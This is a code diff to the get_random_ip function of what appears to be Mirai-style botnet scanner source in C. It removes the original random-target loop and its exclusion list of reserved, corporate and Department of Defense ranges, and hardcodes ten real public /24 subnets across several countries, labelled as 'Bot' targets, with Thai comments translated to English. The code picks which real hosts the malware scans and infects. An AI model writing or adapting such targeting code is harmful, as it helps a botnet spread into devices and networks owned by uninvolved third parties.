@@ -676,43 +676,27 @@ static ipv4_t get_random_ip(void)
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
 
-    // do
-    // {
-    //     tmp = rand_next();
 
-    //     o1 = tmp & 0xff;
-    //     o2 = (tmp >> 8) & 0xff;
-        // o3 = (tmp >> 16) & 0xff;
-    //     o4 = (tmp >> 24) & 0xff;
-    // }
-    // while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
-    //       (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
-    //       (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
-    //       (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
-    //       (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-    //       (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
-    //       (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
-    //       (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
-    //       (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
-    //       (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
-    //       (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
-    //       (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
-    //       (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
-    // );
-
-    // เลือก Subnet ก่อนเลย (แคบตั้งแต่แรก)
-    if (rand_next() % 2 == 0) {
-        o1 = 110; o2 = 164; o3 = 20;
-    } else {
-        o1 = 125; o2 = 20; o3 = 30;
+    // Select target bot subnet (random 0 to 9)
+    uint8_t choice = rand_next() % 10;
+    
+    switch (choice) {
+        case 0: o1 = 110; o2 = 164; o3 = 20; break;     // 110.164.20.0/24   - Bot 1 (IoT Bot - TH)
+        case 1: o1 = 125; o2 = 20;  o3 = 30; break;     // 125.20.30.0/24    - Bot 2 (IoT Bot - TH)
+        case 2: o1 = 66;  o2 = 249; o3 = 64; break;     // 66.249.64.0/24    - Bot 3 (Public IP - US)
+        case 3: o1 = 210; o2 = 89;  o3 = 0;  break;     // 210.89.0.0/24     - Bot 4 (Public IP - KR)
+        case 4: o1 = 114; o2 = 240; o3 = 0;  break;     // 114.240.0.0/24    - Bot 5 (Public IP - CN)
+        case 5: o1 = 95;  o2 = 24;  o3 = 0;  break;     // 95.24.0.0/24      - Bot 6 (Public IP - RU)
+        case 6: o1 = 46;  o2 = 112; o3 = 0;  break;     // 46.112.0.0/24     - Bot 7 (Public IP - DE)
+        case 7: o1 = 177; o2 = 0;   o3 = 0;  break;     // 177.0.0.0/24      - Bot 8 (Public IP - BR)
+        case 8: o1 = 8;   o2 = 2;   o3 = 0;  break;     // 8.2.0.0/24        - Bot 9 (Public IP - UK)
+        case 9: o1 = 1;   o2 = 0;   o3 = 1;  break;     // 1.0.1.0/24        - Bot 10 (Public IP - ASIA)
     }
 
-    // สุ่ม octet สุดท้าย
+    // Randomize the last octet (Host IP)
     do {
         o4 = rand_next() & 0xFF;
-    } while (o4 == 0 || o4 == 255 || o4 == 1);  // ข้าม .0 .1 .255
-
-
+    } while (o4 == 0 || o4 == 255 || o4 == 1);          // Skip Network (.0), Broadcast (.255), Gateway (.1)
 
     return INET_ADDR(o1,o2,o3,o4);
 }
